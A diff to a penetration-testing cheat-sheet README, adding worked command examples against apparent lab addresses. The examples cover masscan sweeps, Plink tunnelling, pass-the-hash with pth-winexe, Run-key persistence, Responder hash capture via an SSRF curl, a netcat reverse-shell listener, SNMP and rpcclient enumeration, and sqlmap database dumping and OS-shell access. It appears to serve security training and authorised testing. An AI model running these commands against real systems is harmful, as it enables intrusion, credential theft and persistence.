@@ -114,7 +114,6 @@ A collection of **useful commands and scripts** for pentesting tools, organized 
   - [SendEmail](#sendemail)
   - [Sharphound](#sharphound)
   - [Shellter](#shellter)
-  - [Simple-server](#simple-server)
   - [Smbclient](#smbclient)
   - [Snmpwalk](#snmpwalk)
   - [Socat](#socat)
@@ -1355,6 +1354,16 @@ cd cheatsheet-pentesting
   ```bash
   masscan <IP_range> -p<ports> --rate=<rate>
   ```
+- **Scan  for web servers (port 80) across an entire Class A subnet**:
+  ```bash
+  sudo masscan -p80 10.0.0.0/8
+  ```
+
+- **Using Masscan with advanced options to scan a smaller subnet**:
+  ```bash
+  sudo masscan -p80 10.11.1.0/24 --rate=1000 -e tap0 --router-ip 10.11.0.1
+  ```
+  rate=1000: Limit the scan to send 1000 packets per second to avoid overloading the network
 ---
 ### Medusa
 - **Run Medusa without specific targets for a basic usage example**:
@@ -1410,11 +1419,13 @@ cd cheatsheet-pentesting
 - **Create a Symbolic Link**:
   ```cmd
   mklink <link_name> <target_path>
+  mklink softlink fileToBeLinkedTo.txt
   ```
 
 - **Create a Hard Link**:
   ```cmd
   mklink /H <link_name> <target_path>
+  mklink /h hardlink secondFile.txt
   ```
 
 - **Create a Directory Junction**:
@@ -1438,20 +1449,27 @@ cd cheatsheet-pentesting
   ```
 ---
 ### Mount
-- **Mount a Filesystem**:
+- **Mount a Filesystem: Mount a filesystem of type ext4**:
   ```bash
   mount <device> <mount_point>
+  mount -t ext4 /dev/sdb1 /mnt/usb
   ```
 
 - **Unmount a Filesystem**:
   ```bash
   umount <mount_point>
+  sudo umount /mnt/usb
   ```
 
 - **List Mounted Filesystems**:
   ```bash
   mount
   ```
+- **Mount a network share (NFS) with the "nolock" option**:
+  ```bash
+  sudo mount -o nolock 10.11.1.72:/home ~/home/
+  ```
+  Disables file locking for NFS mounts, useful if the NFS server doesn't support or use locks.
 ---
 ### Msfvenom
 - **Generate a Reverse Shell Payload**:
@@ -1489,6 +1507,11 @@ cd cheatsheet-pentesting
 - **Scan with Verbose Output**:
   ```bash
   nbtscan -v <IP_range>
+  ```
+- **Scan a subnet for NetBIOS names using nbtscan**:
+  ```bash
+  nbtscan -r <IP_range>
+  sudo nbtscan -r 10.11.1.0/24
   ```
 ---
 ### Nessus
@@ -1547,6 +1570,16 @@ cd cheatsheet-pentesting
   ```bash
   netstat -p
   ```
+- **The command displays listening TCP/UDP ports, the processes using them, and more detailed connection info.**:
+  ```bash
+  netstat -tulpen
+  ```
+
+- ** This command will display TCP and UDP connections along with their respective states and the processes responsible for them.**:
+  ```bash
+  netstat -natup
+  ```
+
 ---
 ### Nslookup
 - **Query an IP Address**:
@@ -1638,6 +1671,15 @@ cd cheatsheet-pentesting
   ```bash
   plink -ssh <username>@<host> <command>
   ```
+- **Setting up remote port forwarding on a remote host using Plink**:
+  ```bash
+  plink.exe -ssh -l tester -pw password -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
+  ```
+
+- **Establishing a remote tunnel using Plink in non-interactive mode**:
+  ```bash
+  cmd.exe /c echo y | plink.exe -ssh -l user -pw password -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
+  ```
 ---
 ### Powercat
 - **Start a Listener**:
@@ -1677,7 +1719,10 @@ cd cheatsheet-pentesting
   ```bash
   pth-winexe -U <domain>/<username>%<hash> //<target_ip> <command>
   ```
-
+- **Using pth-winexe to pass the hash and execute a command on a remote Windows machine**:
+  ```bash
+  pth-winexe -U tester%aad3b435b5dsdfsdfb435b51404ee:2892d26csdfdsfb9f05c425e //10.11.0.22 cmd
+  ```
 ### Python
 - **Run a Python Script**:
   ```bash
@@ -1721,18 +1766,51 @@ cd cheatsheet-pentesting
   ```cmd
   reg add <key_path> /v <value_name> /t <type> /d <data>
   ```
+- **Query the "RunOnce" key in the registry for current user (HKCU)**:
+  ```cmd
+  reg query hkcu\software\microsoft\windows\currentversion\runonce
+  ```
+
+- **Query the "Run" key in the registry for current user (HKCU)**:
+  ```cmd
+  reg query hkcu\software\microsoft\windows\currentversion\run
+  ```
+- **Delete all values under the "Run" key for the current user (HKCU)**:
+  ```cmd
+  reg delete hkcu\software\microsoft\windows\currentversion\run /va
+  ```
+
+- **Add a new entry to the "Run" key for the current user (HKCU)**:
+  ```cmd
+  reg add hkcu\software\microsoft\windows\currentversion\run /v OneDrive /t REG_SZ /d "C:\Users\Offsec\AppData\Local\Microsoft\OneDrive\OneDrive.exe"
+  ```
+- **Export the "Environment" key for the current user (HKCU) to a file**:
+  ```cmd
+  reg export hkcu\environment environment
+  ```
 
 ### Responder
 - **Start Responder**:
   ```bash
   responder -I <interface>
+  sudo responder -I tap0
   ```
 
 - **Run in Analysis Mode**:
   ```bash
   responder -I <interface> -A
   ```
-
+- **Running Responder on the 'eth0' interface in verbose mode**:
+  ```bash
+  responder -I eth0 -rv
+  ```
+- **Running Responder on our active network interface to capture NTLMv2 handshakes**:
+  ```bash
+  responder -I eth0 
+  curl http://192.168.120.91:8080/?url=http://our-ip
+  ```
+   It's often used in situations like Server-Side Request Forgery (SSRF) attacks, where an attacker can make a server request another service or system within the same 
+   network.
 ### Rinetd
 - ** Update package lists and install rinetd from the Kali Linux repositories**:
   ```bash
@@ -1769,6 +1847,10 @@ cd cheatsheet-pentesting
   ```bash
   rlwrap -H <history_file> <command>
   ```
+- **Use rlwrap with netcat (nc) for a better reverse shell experience**:
+  ```bash
+  rlwrap -cAr nc -lvnp 443
+  ```
 
 ### Rpcclient
 - **Connect to an SMB Server**:
@@ -1779,6 +1861,10 @@ cd cheatsheet-pentesting
 - **Enumerate Users**:
   ```bash
   enumdomusers
+  ```
+- ** List the user accounts on the domain using rpcclient(anonymous login)**:
+  ```bash
+  rpcclient -W '' -c querydispinfo -U ''%'' '192.168.155.175'
   ```
 
 ### RSMangler
@@ -1802,6 +1888,10 @@ cd cheatsheet-pentesting
   ```cmd
   runas /user:<username> /savecred "<command>"
   ```
+- **Running the command without loading the user's profile (no environment variables from the profile are set)**:
+  ```cmd
+  runas /noprofile /user:mymachine\tester cmd
+  ```
 
 ### SC
 - **Query Service Status**:
@@ -1812,8 +1902,19 @@ cd cheatsheet-pentesting
 - **Start a Service**:
   ```cmd
   sc start <service_name>
+  sc start WSearch
+  ```
+- **Query Service Status**:
+  ```cmd
+  sc query <service_name>
+  sc query dhcp
   ```
 
+- **Configuring the Windows Search service to start automatically**:
+  ```cmd
+  sc config WSearch start=auto
+  ```
+  
 ### Schtasks
 - **Create a Scheduled Task**:
   ```cmd
@@ -1850,6 +1951,12 @@ cd cheatsheet-pentesting
 - **Copy a File from a Remote Server**:
   ```bash
   scp <username>@<host>:<remote_file> <local_path>
+  scp -P 2222 tester@192.168.166.52:/challenge/flag.txt /tmp/flag.txt
+  ```
+- **Copy a File to a Remote Server**:
+  ```bash
+  scp <file> <username>@<host>:<remote_path>
+  scp -r /home/mindsflee/test.txt kali@192.168.49.124:/tmp/test.txt
   ```
 
 ### Sed
@@ -1888,7 +1995,7 @@ cd cheatsheet-pentesting
   ```cmd
   SharpHound.exe -c All
   ```
-
+  This is useful for gathering comprehensive information about the target environment’s attack surface in Active Directory.
 - **Compress Output Files**:
   ```cmd
   SharpHound.exe -c All --zip
@@ -1903,12 +2010,6 @@ cd cheatsheet-pentesting
 - **Specify Input and Output Files**:
   ```bash
   shellter -a -f <input_exe> -o <output_exe>
-  ```
-
-### Simple-Server
-- **Start an HTTP Server**:
-  ```bash
-  python -m http.server <port>
   ```
 
 ### Smbclient
@@ -1928,9 +2029,31 @@ cd cheatsheet-pentesting
   snmpwalk -v <version> -c <community_string> <IP_address>
   ```
 
-- **Specify an OID**:
+- **Specify an OID: Enumerate open TCP ports on the target using SNMP**:
   ```bash
   snmpwalk -v <version> -c <community_string> <IP_address> <OID>
+  snmpwalk -c public -v1 10.11.1.14 1.3.6.1.2.1.6.13.1.3
+  ```
+- **Enumerate the entire MIB tree on the target using SNMPv1**:
+  ```bash
+  snmpwalk -c public -v1 -t 10 10.11.1.14
+  ```
+- **Enumerate Windows users on the target using SNMP**:
+  ```bash
+  snmpwalk -v <version> -c <community_string> <IP_address> <OID>
+  snmpwalk -c public -v1 10.11.1.14 1.3.6.1.4.1.77.1.2.25
+  ```
+  1.3.6.1.4.1.77.1.2.25: OID (Object Identifier) for listing Windows user accounts.
+- **Enumerate installed software on the target using SNMP**:
+  ```bash
+  snmpwalk -v <version> -c <community_string> <IP_address> <OID>
+  snmpwalk -c public -v1 10.11.1.50 1.3.6.1.2.1.25.6.3.1.2
+  ```
+
+- **Enumerate running Windows processes on the target using SNMP**:
+  ```bash
+  snmpwalk -v <version> -c <community_string> <IP_address> <OID>
+  snmpwalk -c public -v1 10.11.1.73 1.3.6.1.2.1.25.4.2.1.2
   ```
 
 ### Socat
@@ -1959,6 +2082,19 @@ cd cheatsheet-pentesting
 - **Specify a POST Request**:
   ```bash
   sqlmap -u <url> --data="<POST_data>"
+  ```
+- **Basic SQL injection test using sqlmap**:
+  ```bash
+  sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id"
+  ```
+
+- **Using sqlmap to dump the entire database**:
+  ```bash
+  sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --dump --level=3 --risk=3
+  ```
+  - **Using sqlmap to gain an OS shell on the target server**:
+  ```bash
+  sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --os-shell
   ```
 
 ### Sqsh
